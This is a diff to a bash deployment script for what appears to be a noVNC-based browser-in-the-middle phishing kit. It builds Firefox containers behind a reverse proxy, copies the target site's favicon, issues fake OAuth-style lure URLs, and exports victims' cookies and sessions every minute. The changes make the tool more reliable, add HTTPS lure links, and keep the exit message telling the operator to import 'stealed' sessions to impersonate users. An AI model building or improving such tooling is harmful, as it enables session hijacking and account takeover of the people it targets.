@@ -48,11 +48,16 @@ case "$1" in
 "install")
 	sudo docker build -t vnc-docker -f ./VNC-Dockerfile ./
 	sudo docker build -t mvnc-docker -f ./MVNC-Dockerfile ./
+	sudo docker build -t cvnc-docker -f ./CVNC-Dockerfile ./
+	sudo docker build -t cmvnc-docker -f ./CMVNC-Dockerfile ./
 	sudo docker build -t rev-proxy -f ./PROXY-Dockerfile ./
+	sudo docker build -t nophish-panel -f ./PANEL-Dockerfile ./
+	sudo docker build -t nophish-nginx -f ./NGINX-Dockerfile ./
 	;;
 "cleanup")
-	sudo docker rm -f $(sudo docker ps --filter=name="vnc-*" -q)
-	sudo docker rm -f $(sudo docker ps --filter=name="rev-proxy" -q)
+	sudo docker rm -f $(sudo docker ps -a --filter=name="vnc-*" -q) &> /dev/null
+	sudo docker rm -f $(sudo docker ps -a --filter=name="mvnc-*" -q) &> /dev/null
+	sudo docker rm -f $(sudo docker ps -a --filter=name="rev-proxy" -q) &> /dev/null
 	while true; do
 	    read -p "Do you want to perform a full cleanup? " yn
 	    case $yn in
@@ -67,24 +72,54 @@ case "$1" in
 	done
 	;;
 *)
-	
+
 	# Print helpFunction in case parameters are empty
 	if [ -z "$User" ] || [ -z "$Domain" ] || [ -z "$Target" ]
 	then
 		echo "Some or all of the parameters are empty";
 		helpFunction
 	fi
-	
+
+	# --- Clean up any existing containers from a previous run ---
+	printf "[-] Cleaning up any existing containers from previous run...\033[0K\r\n"
+	START_CLEAN=1
+	END_CLEAN=$(($User * 2))
+	for (( i=$START_CLEAN; i<=$END_CLEAN; i++ ))
+	do
+		sudo docker rm -f "vnc-user$i" &> /dev/null
+		sudo docker rm -f "mvnc-user$i" &> /dev/null
+	done
+	sudo docker rm -f rev-proxy &> /dev/null
+	sleep 1
+	printf "[+] Cleanup done\n"
+
+	# Helper: wait for a container to be in running state
+	wait_for_container() {
+		local container_name=$1
+		local max_wait=30
+		local waited=0
+		while [ $waited -lt $max_wait ]; do
+			local state=$(sudo docker inspect -f '{{.State.Running}}' "$container_name" 2>/dev/null)
+			if [ "$state" = "true" ]; then
+				return 0
+			fi
+			sleep 1
+			waited=$((waited + 1))
+		done
+		echo "ERROR: Container $container_name failed to start within ${max_wait}s"
+		return 1
+	}
+
 	if [ -z "$rzip" ]
 	then
 		rzip=true
 	fi
 	
-	if [ -n "$SSL" ]
+	if [ "$SSL" = "true" ]
 	then
 		if [ -z "$cert" ] || [ -z "$key" ]
 		then
-		echo "Some or all of the parameters are empty";
+		echo "SSL enabled but certificate or key path not provided";
 		helpFunction
 		elif [ ! -f "$cert" ] || [ ! -f "$key" ]
 		then 
@@ -102,9 +137,8 @@ case "$1" in
 	curl https://www.google.com/s2/favicons?domain=$Target -sL --output novnc.ico
 	icopath="./novnc.ico"
 	
-	printf "[-] Configuration file generating\033[0K\r" 
-	echo 'NameVirtualHost *
-             Header unset ETag
+	printf "[-] Configuration file generating\033[0K\r"
+	echo 'Header unset ETag
              Header set Cache-Control "max-age=0, no-cache, no-store, must-revalidate"
              Header set Pragma "no-cache"
              Header set Expires "Wed, 12 Jan 1980 05:00:00 GMT"
@@ -337,14 +371,14 @@ case "$1" in
 	    Token=$(cat /proc/sys/kernel/random/uuid)
 	    if [ "$mobile" = "true" ]
 	    then
-	    	sudo docker run -dit --name mvnc-user$c -e VNC_PW=$PW -e NOVNC_HEARTBEAT=30 mvnc-docker  &> /dev/null 
-	    	sleep 1
+	    	sudo docker run -dit --name mvnc-user$c -e VNC_PW=$PW -e NOVNC_HEARTBEAT=30 mvnc-docker  &> /dev/null
+	    	wait_for_container "mvnc-user$c" || continue
 	    	sudo docker exec mvnc-user$c sh -c "firefox &" &> /dev/null
 	    	sleep 1
 	    	sudo docker exec mvnc-user$c sh -c "pidof firefox | xargs kill &" &> /dev/null
 	    else
-	    	sudo docker run -dit --name vnc-user$c -e VNC_PW=$PW -e NOVNC_HEARTBEAT=30 vnc-docker  &> /dev/null 
-	    	sleep 1
+	    	sudo docker run -dit --name vnc-user$c -e VNC_PW=$PW -e NOVNC_HEARTBEAT=30 vnc-docker  &> /dev/null
+	    	wait_for_container "vnc-user$c" || continue
 	    	sudo docker exec vnc-user$c sh -c "firefox &" &> /dev/null
 	    	sleep 1
 	    	sudo docker exec vnc-user$c sh -c "pidof firefox | xargs kill &" &> /dev/null
@@ -360,7 +394,7 @@ case "$1" in
 		    	echo 'user_pref("signon.rememberSignons", false);' >> ./vnc/muser.js
 		    	echo 'user_pref("signon.formlessCapture.enabled", false);' >> ./vnc/muser.js
 		    	echo 'user_pref("signon.storeWhenAutocompleteOff", false);' >> ./vnc/muser.js
-       			echo 'user_pref("layout.css.devPixelsPerPx", "0.9");' >> ./vnc/muser.js
+       			echo 'user_pref("layout.css.devPixelsPerPx", "1.0");' >> ./vnc/muser.js
 		    	sudo docker cp ./vnc/muser.js mvnc-user$c:/home/headless/user.js
 		    	sudo docker exec mvnc-user$c sh -c "find -name cookies.sqlite -exec dirname {} \; -exec sh -c 'cp -f /home/headless/user.js {}' \;"
 		else
@@ -383,7 +417,7 @@ case "$1" in
 		    	echo 'user_pref("signon.rememberSignons", false);' >> ./vnc/muser.js
 		    	echo 'user_pref("signon.formlessCapture.enabled", false);' >> ./vnc/muser.js
 		    	echo 'user_pref("signon.storeWhenAutocompleteOff", false);' >> ./vnc/muser.js
-		    	echo 'user_pref("layout.css.devPixelsPerPx", "0.9");' >> ./vnc/muser.js
+		    	echo 'user_pref("layout.css.devPixelsPerPx", "1.0");' >> ./vnc/muser.js
 		    	sudo docker cp ./vnc/muser.js mvnc-user$c:/home/headless/user.js
 		    	sudo docker exec mvnc-user$c sh -c "find -name cookies.sqlite -exec dirname {} \; -exec sh -c 'cp -f /home/headless/user.js {}' \;"
 	    	else    	
@@ -480,9 +514,9 @@ case "$1" in
 
 	    if [ "$mobile" = "true" ]
 	    then
-            	CIP=$(sudo sudo docker container inspect mvnc-user$c | grep -m 1 -oP '"IPAddress":\s*"\K[^"]+')
+            	CIP=$(sudo docker container inspect mvnc-user$c | grep -m 1 -oP '"IPAddress":\s*"\K[^"]+')
 	    else
-	    	CIP=$(sudo sudo docker container inspect vnc-user$c | grep -m 1 -oP '"IPAddress":\s*"\K[^"]+')
+	    	CIP=$(sudo docker container inspect vnc-user$c | grep -m 1 -oP '"IPAddress":\s*"\K[^"]+')
 	    fi
 	    
 	    	    
@@ -583,11 +617,11 @@ case "$1" in
 	    echo "
 	    	RewriteCond %{REQUEST_URI} /v$c
 	    	RewriteCond %{HTTP_USER_AGENT} \"iPhone|Android|iPad\"
-    		RewriteRule ^/(.*) /miframe$c.html [P,L]
-    		
+    		RewriteRule ^/(.*) /miframe$c.html [PT,L]
+
     		RewriteCond %{REQUEST_URI} /v$c
     		RewriteCond %{HTTP_USER_AGENT} !(iPhone|Android|iPad)
-    		RewriteRule ^/(.*) /iframe$c.html [P]
+    		RewriteRule ^/(.*) /iframe$c.html [PT,L]
 	    " >> ./proxy/000-default.conf
 	    fi
 	    
@@ -630,9 +664,9 @@ case "$1" in
 		then
 			if [ -n "$param" ]
 			then
-			urls+=("http://$Domain/v$c/$param")
+			urls+=("https://$Domain/v$c/$param")
 			else
-			urls+=("http://$Domain/v$c/oauth2/authorize?access-token=$Token")
+			urls+=("https://$Domain/v$c/oauth2/authorize?access-token=$Token")
 			fi
 		fi
 	    else
@@ -706,17 +740,17 @@ case "$1" in
 	else
 		sudo docker run -dit -p80:80 -p65534:65534 --name rev-proxy rev-proxy /bin/bash       &> /dev/null
 	fi
-	
-	sleep 5
+
+	wait_for_container "rev-proxy" || echo "Warning: Reverse proxy container failed to start, continuing anyway"
 
 	if [ -n "$SSL" ]
 	then
-		sudo docker cp $cert rev-proxy:/etc/ssl/certs/server.pem
-		sudo docker cp $key rev-proxy:/etc/ssl/private/server.key
+		sudo docker cp "$(readlink -f $cert)" rev-proxy:/etc/ssl/certs/server.pem
+		sudo docker cp "$(readlink -f $key)" rev-proxy:/etc/ssl/private/server.key
 	fi
 	
-	sudo docker exec rev-proxy /bin/bash -c 'echo "Listen 65534" >> /etc/apache2/ports.conf' 
-	sudo docker exec -it rev-proxy /bin/bash -c "htpasswd -cb /etc/apache2/.htpasswd angler $AdminPW"
+	sudo docker exec rev-proxy /bin/bash -c 'grep -q "Listen 65534" /etc/apache2/ports.conf || echo "Listen 65534" >> /etc/apache2/ports.conf'
+	sudo docker exec rev-proxy /bin/bash -c "htpasswd -cb /etc/apache2/.htpasswd angler $AdminPW"
 	sudo docker cp ./proxy/000-default.conf rev-proxy:/etc/apache2/sites-enabled/   &> /dev/null
 	sudo docker cp ./novnc.ico rev-proxy:/var/www/html/favicon.ico
 
@@ -733,10 +767,9 @@ case "$1" in
 
 	sudo docker exec rev-proxy sed -i 's/MaxKeepAliveRequests 100/MaxKeepAliveRequests 0/' '/etc/apache2/apache2.conf'
 	
-	sudo docker exec rev-proxy /bin/bash service apache2 restart &> /dev/null
+	sudo docker exec rev-proxy /bin/bash -c "service apache2 restart"
         sudo docker exec rev-proxy /bin/bash -c "cron"
         sleep 3
-        sudo docker exec rev-proxy /bin/bash -c "crontab"
         sudo docker cp ./output/status.php rev-proxy:/var/www/html/
         rm -r ./novnc.ico
         printf "[+] Reverse proxy running \033[0K\r\n"  
@@ -768,7 +801,19 @@ case "$1" in
 	printf "[+] You can check and view the open session by use of the status.php in the output directory\n" 
 	#Start a loop which copies the cookies from the containers
 	printf "    Every 60 Seconds Cookies and Sessions are exported - Press [CTRL+C] to stop..\n"
-	trap 'printf "\n[-] Import stealed session and cookie JSON or the firefox profile to impersonate user\n"; printf "[-] VNC and Rev-Proxy container will be removed\n" ; sleep 2 ; sudo docker rm -f $(sudo docker ps --filter=name="vnc-*" -q) &> /dev/null && sudo docker rm -f $(sudo docker ps --filter=name="rev-proxy" -q) &> /dev/null & printf "[+] Done!"; sleep 2' SIGTERM EXIT
+	cleanup() {
+		trap - SIGINT SIGTERM EXIT
+		printf "\n[-] Import stealed session and cookie JSON or the firefox profile to impersonate user\n"
+		printf "[-] VNC and Rev-Proxy container will be removed\n"
+		sleep 2
+		sudo docker rm -f $(sudo docker ps -a --filter=name="vnc-*" -q) &> /dev/null
+		sudo docker rm -f $(sudo docker ps -a --filter=name="mvnc-*" -q) &> /dev/null
+		sudo docker rm -f $(sudo docker ps -a --filter=name="rev-proxy" -q) &> /dev/null
+		printf "[+] Done!\n"
+		sleep 1
+		exit 0
+	}
+	trap cleanup SIGINT SIGTERM EXIT
 	sleep 60
 	
 
